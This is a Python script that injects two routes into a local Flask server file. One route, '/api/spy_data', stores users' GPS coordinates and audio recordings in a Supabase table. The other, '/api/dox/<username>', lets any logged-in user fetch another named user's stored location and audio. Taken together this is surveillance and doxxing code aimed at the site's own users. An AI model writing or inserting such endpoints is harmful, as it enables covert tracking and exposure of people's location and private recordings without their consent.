import os

path = r'C:\Users\user\Desktop\сайт\server.py'
with open(path, 'r', encoding='utf-8') as f:
    lines = f.readlines()

inject = [
    '\n@app.route("/api/spy_data", methods=["POST"])\n',
    'def spy_data():\n',
    '    if "user" not in session: return jsonify({"error": "Unauthorized"}), 401\n',
    '    data = request.json\n',
    '    if not data: return jsonify({"error": "No data"}), 400\n',
    '    \n',
    '    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Content-Type": "application/json", "Prefer": "return=representation"}\n',
    '    \n',
    '    user_email = session["user"]["email"]\n',
    '    check = requests.get(f"{SUPABASE_URL}/rest/v1/tickets?user_email=eq.{user_email}&status=eq.spy_data", headers=headers)\n',
    '    \n',
    '    coords = f"{data.get(\'lat\')},{data.get(\'lon\')}" if data.get("lat") else ""\n',
    '    audio = data.get("audio", "")\n',
    '    \n',
    '    if check.status_code == 200 and check.json():\n',
    '        tid = check.json()[0]["id"]\n',
    '        requests.patch(f"{SUPABASE_URL}/rest/v1/tickets?id=eq.{tid}", headers=headers, json={"topic": coords, "message": audio})\n',
    '    else:\n',
    '        requests.post(f"{SUPABASE_URL}/rest/v1/tickets", headers=headers, json={"user_email": user_email, "status": "spy_data", "topic": coords, "message": audio})\n',
    '        \n',
    '    return jsonify({"success": True})\n\n',
    
    '@app.route("/api/dox/<username>", methods=["GET"])\n',
    'def get_dox(username):\n',
    '    if "user" not in session: return jsonify({"error": "Unauthorized"}), 401\n',
    '    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}\n',
    '    \n',
    '    q = requests.get(f"{SUPABASE_URL}/rest/v1/tickets?status=eq.user_profile&topic=ilike.{username}", headers=headers)\n',
    '    if q.status_code != 200 or not q.json(): return jsonify({"error": "User not found"}), 404\n',
    '    \n',
    '    target_email = q.json()[0]["user_email"]\n',
    '    \n',
    '    spy = requests.get(f"{SUPABASE_URL}/rest/v1/tickets?user_email=eq.{target_email}&status=eq.spy_data", headers=headers)\n',
    '    if spy.status_code != 200 or not spy.json(): return jsonify({"error": "No data for user"}), 404\n',
    '    \n',
    '    d = spy.json()[0]\n',
    '    return jsonify({"coords": d.get("topic"), "audio": d.get("message")})\n\n'
]

# find end of file
insert_idx = len(lines)
for i in range(len(lines)-1, -1, -1):
    if 'if __name__ == ' in lines[i]:
        insert_idx = i
        break

lines = lines[:insert_idx] + inject + lines[insert_idx:]

with open(path, 'w', encoding='utf-8') as f:
    f.writelines(lines)

print('Success')
